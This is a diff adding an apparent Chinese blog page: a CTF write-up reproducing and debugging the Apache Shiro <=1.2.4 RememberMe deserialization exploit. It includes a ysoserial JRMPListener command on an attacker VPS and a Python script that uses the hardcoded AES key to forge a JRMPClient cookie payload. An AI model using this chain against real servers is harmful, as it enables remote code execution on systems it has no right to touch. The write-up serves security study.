@@ -1,0 +1,513 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="小喇叭">
+  <meta name="keywords" content="">
+  <title>JAVA反序列化题目-强网杯 2018 彩蛋 - 小喇叭</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>xiaolaba's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="JAVA反序列化题目-强网杯 2018 彩蛋">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-19 14:31" pubdate>
+        2021年2月19日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">JAVA反序列化题目-强网杯 2018 彩蛋</h1>
+            
+            <div class="markdown-body">
+              <h1 id="JAVA反序列化题目-强网杯-2018-彩蛋"><a href="#JAVA反序列化题目-强网杯-2018-彩蛋" class="headerlink" title="JAVA反序列化题目-强网杯 2018 彩蛋"></a>JAVA反序列化题目-强网杯 2018 彩蛋</h1><h2 id="Shiro漏洞说明"><a href="#Shiro漏洞说明" class="headerlink" title="Shiro漏洞说明"></a>Shiro漏洞说明</h2><p>Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在Apache Shiro &lt;= 1.2.4版本中存在反序列化漏洞。</p>
+<blockquote>
+<p>Shiro会以header中cookie的一个值Remember Me来进行对未经过身份验证(没有账号密码)的用户进行验证</p>
+<p>Remember Me的值会经过以下操作</p>
+<p>1.base64decode</p>
+<p>2.AES解密</p>
+<p>3.反序列化</p>
+</blockquote>
+<p>可以看到其最后一个操作是反序列化，那么如果我们能获得AES的密钥，就能生成任意的反序列化序列，进而利用shiro里的第三方库（如commons-collections3.2.1)形成任意代码执行。而在shiro&lt;=1.2.4以前，<strong>AES的密钥是硬编码存在配置文件中</strong>,从而就形成了这个漏洞</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境搭建在网上有很多教程，就不贴了</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>先获取rememberMe</p>
+<p><img src="https://i.loli.net/2021/02/03/eUndgiSHsmLQMCr.png" srcset="/img/loading.gif"></p>
+<p>vps运行yeoserial.JRMPListener</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> ysoserial<span class="hljs-literal">-0</span>.<span class="hljs-number">0.6</span>.jar ysoserial.exploit.JRMPListener <span class="hljs-number">7521</span> CommonsCollections7 calc.exe<br></code></pre></td></tr></table></figure>
+
+
+<p>然后生成payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pip install pycrypto</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.6.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS   = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key  =  <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode =  AES.MODE_CBC<br>    iv   =  uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])    <br>    print(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/02/03/kc3jnhJeyBHL6Nz.png" srcset="/img/loading.gif"></p>
+<p>直接放在rememberMe字段中，重新发包，成功弹出计算器</p>
+<p><img src="https://i.loli.net/2021/02/03/WzCVYcJReM5X7lb.png" srcset="/img/loading.gif"></p>
+<p>可以看到漏洞触发的调用栈</p>
+<p><img src="https://i.loli.net/2021/02/03/EPmFjxICKRGh689.png" srcset="/img/loading.gif"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据刚才的调用栈定位到<code>org.apache.shiro.mgt.AbstractRememberMeManager.deserialize</code>，打下断点</p>
+<p><img src="https://i.loli.net/2021/02/03/H2XOZ4MQkCs5lnR.png" srcset="/img/loading.gif"></p>
+<p>回退到<code>AbstractRememberMeManager#getRememberedPrincipals</code>，他先调<code>AbstractRememberMeManager#getRememberedSerializedIdentity</code></p>
+<p><img src="https://i.loli.net/2021/02/03/6oFe7aMpzvZHdEA.png" srcset="/img/loading.gif"></p>
+<p><code>AbstractRememberMeManager#getRememberedSerializedIdentity</code>,它会获取cookie中的值，然后进行base64解码<img src="C:\Users\劳锦伦\AppData\Roaming\Typora\typora-user-images\image-20210203163331232.png" srcset="/img/loading.gif" alt="image-20210203163331232"></p>
+<p>回到<code>AbstractRememberMeManager#getRememberedPrincipals</code>，调用<code>AbstractRememberMeManager#convertBytesToPrincipals</code>,用<code>decrypt</code>解密数组，然后就丢进<code>deserialize</code>.</p>
+<p><strong>PS:这里的加密算法就是AES，他是对称加密算法，由于它把密钥写在了代码中，因此我们获取了密钥后，用该密钥加密我们的payload,就能正常解密</strong></p>
+<p><img src="https://i.loli.net/2021/02/03/BZmhvbfQNeDJTMo.png" srcset="/img/loading.gif"></p>
+<p><code>AbstractRememberMeManager#deserialize</code>，调用<code>DefaultSerializer#deserialize</code></p>
+<p><img src="https://i.loli.net/2021/02/03/uKaxVYrLHhBNXDA.png" srcset="/img/loading.gif"></p>
+<p><code>DefaultSerializer#deserialize</code>，这里与正常的反序列化不同的地方是<code>ObjectInputStream</code>，是一个shiro自己实现的类<code>ClassResolvingObjectInputStream</code>，它继承于<code>ObjectInputStream</code></p>
+<p><img src="https://i.loli.net/2021/02/03/ynvSg95pKhGF81J.png" srcset="/img/loading.gif"></p>
+<p><code>ClassResolvingObjectInputStream</code>,它里面也很简单，就重写了<code>resolveClass</code>,它写了个ClassUtils用于加载类(<strong>这是个坑点，要好好研究</strong>)</p>
+<p><img src="https://i.loli.net/2021/02/03/7XLspiBDlHPgOvN.png" srcset="/img/loading.gif"></p>
+<p>正常的<code>resolveClass</code></p>
+<p><img src="https://i.loli.net/2021/02/03/PCLi4nFAjcE1rf7.png" srcset="/img/loading.gif"></p>
+<p>后面就是正常的<code>rmi注册中心打rmi客户端了</code>。我们传的payload就是<code>ysoserial.payload.JRMPClient</code>。当它被反序列化后会向指定的rmi注册中心请求，然后rmi注册中心(vps)控制报错信息返回<code>CommonsCollections5</code>的payload，然后<code>rmi客户端</code>又将报错信息反序列化，此时就攻击成功了。</p>
+<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><h4 id="1-Commons-Collections版本问题"><a href="#1-Commons-Collections版本问题" class="headerlink" title="1.Commons-Collections版本问题"></a>1.Commons-Collections版本问题</h4><p>网上有些文章中测试漏洞时用了<code>ysoserial.payload.CommonsCollections2</code>的payload,因为他们把shiro中的<code>CommonsCollections</code>改成了4.0版本，但是shiro中<code>CommmonsCollections</code>的默认版本是<code>3.2.1</code>，因此默认是不能用<code>ysoserial.payload.CommonsCollections2</code>的payload</p>
+<h4 id="2-添加pom-xml问题"><a href="#2-添加pom-xml问题" class="headerlink" title="2.添加pom.xml问题"></a>2.添加pom.xml问题</h4><p><img src="https://i.loli.net/2021/02/03/2olbkzdCYw7uvOy.png" srcset="/img/loading.gif"></p>
+<p>由于shiro中本来就存在Commons-Collections:3.2.1，所以我就没有在pom.xml中再添加Commons-Collections，但是这样带来了一个问题，就是用上述的payload打时可以看到rmi客户端请求了rmi注册中心，rmi注册中心也返回了payload。rmi客户端也反序列化了payload，但是死活就是无法弹出计算器，通过一顿调试，终于发现当它反序列化Commons-Collections中的类时就会爆出<code>ClassnotFound</code>错误，估计就是没添加Commons-Collections的原因</p>
+<p>因此虽然shiro里已经存在Commons-Collections:3.2.1，但是仍然在<code>Pom.xml</code>中添加它，这样才能成功利用</p>
+<p><img src="https://i.loli.net/2021/02/03/MFfxqAkuzl1UBtd.png" srcset="/img/loading.gif"></p>
+<h4 id="3-关于为何不直接用CommonsCollections5的问题"><a href="#3-关于为何不直接用CommonsCollections5的问题" class="headerlink" title="3.关于为何不直接用CommonsCollections5的问题"></a>3.关于为何不直接用CommonsCollections5的问题</h4><p>这个问题本来根据网上的说法<code>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class</code>，就已经解决了问题（懒，不想去调试。但是最近又看到了一篇的文章，里面说了另外的一个原因，突然就困惑起来了，感觉可以好好研究研究 。</p>
+<p>暂时觉得两者都有道理</p>
+<p>如果不再tomcat环境下用<code>ClassResolvingObjectInputStream</code>,确实是因为<code>Class.loadClass不能加载原生类型和数组类型</code>而无法加载<code>Transformer[]</code>，因此此时连<code>java.lang.StackTraceElement[]</code>也无法加载。但是当在tomcat环境中时，就是由于Tomcat<code>和</code>JDK<code>的</code>Classpath<code>是不公用且不同的，</code>Tomcat<code>启动时，不会用</code>JDK<code>的</code>Classpath，而导致没有找到<code>Transformer[]</code></p>
+<p>不过还有个问题，要是这样的话，那为什么不是<code>Transformer[]</code>的<code>commonscollections</code>类却能被加载呢？</p>
+<p>解答：</p>
+<p>在<code>Webappclassloader#ClassLoader</code>中，它会经行多次的loadclass操作，直到所有的方式都失败才会返回<code>ClassNotFound</code>，而前面几个方式用的都是<code>Class.loadClass</code>,因此无法加载数组，最后一个方式调用的是<code>Class.forName</code>,按理说数组也是可以加载的。那么通过多次调试，最终的结论就是：</p>
+<p>在<code>Class.forName</code>前，会查找本地仓库，但是由于它不会像<code>Class.forName</code>一样对path进行处理，导致数组传进去的path有问题，就无法通过这里加载了，但是其他的类，比如<code>org.apache.commons.collections.functors.ChainedTransformer</code>,还是可以正常在本地仓库上找到的，可以看到<code>ChainedTransformer</code>从这里返回</p>
+<p><img src="https://i.loli.net/2021/02/04/YmnkcGPBq8fwt47.png" srcset="/img/loading.gif"></p>
+<p>而<code>[Lorg.apache.commons.collections.Transformer;</code>在这一步变成了<code>/[Lorg/apache/commons/collections/Transformer;.class</code>，这怎么可能找得到类</p>
+<p><img src="https://i.loli.net/2021/02/04/UTPOqI4y8lw1kYt.png" srcset="/img/loading.gif"></p>
+<p>最后一处调用<code>Class.forName</code>,loader为<code>URLClassLoader</code></p>
+<p><img src="https://i.loli.net/2021/02/04/iWXF7ZEJfSw5V6N.png" srcset="/img/loading.gif"></p>
+<p>进到loadClass函数后可以看到类名被正确解析了,进到findClass，进而到<code>URLClassPath#getResource</code>中</p>
+<p><img src="https://i.loli.net/2021/02/04/P5niG7jMcUat9dW.png" srcset="/img/loading.gif"></p>
+<p><code>URLClassPath#getResource</code>，我仔细看了看path,都是在tomcat环境里的jar path</p>
+<p><img src="https://i.loli.net/2021/02/04/zfZe4BS9EMWvOPK.png" srcset="/img/loading.gif"></p>
+<p><img src="https://i.loli.net/2021/02/04/JWcVMKgF61t3kbZ.png" srcset="/img/loading.gif"></p>
+<p>那么找不到<code>Lorg.apache.commons.collections.Transformer</code>就不奇怪了，因此他就不能用<code>CommonsCollections5</code></p>
+<p>对于直接用<code>ClassResolvingObjectInputStream</code>替换<code>ObjectInputStream</code>，反序列化CC5链,也不能成功反序列化的原因是由于<code>ClassUtils#loadClass</code>获取的<code>ClassLoader</code>为<code>AppClassLoader</code>而不是上面的<code>WebappClassloader</code>,自然就不会调用到<code>Class.forName</code>,也就无法加载数组了</p>
+<p><img src="https://i.loli.net/2021/02/04/GPn39kbhtlQxfAd.png" srcset="/img/loading.gif"></p>
+<p>可以看到这里连<code>java.lang.StackTraceElement</code>都无法加载</p>
+<p><img src="https://i.loli.net/2021/02/04/jbZItUSvCJeiEFn.png" srcset="/img/loading.gif"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.shiro.test;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.ObjID;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> org.apache.shiro.io.ClassResolvingObjectInputStream;<br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><span class="hljs-keyword">import</span> sun.rmi.transport.LiveRef;<br><span class="hljs-keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jrmpclient</span> </span>&#123;<br>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;D:\\ysoserial-master\\Output\\cc5.bin&quot;</span>);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ClassResolvingObjectInputStream(fis);<br>        ois.readObject();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+<p>自此，Shiro反序列化就算完成了，学到了很多（调试使我快乐</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E8%B7%B3%E5%9D%91">http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E8%B7%B3%E5%9D%91</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/java%E9%A2%98%E7%9B%AE/">java题目</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-Final/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JAVA反序列化题目-网鼎杯 2020 Final</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/06/07/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">python反序列化学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
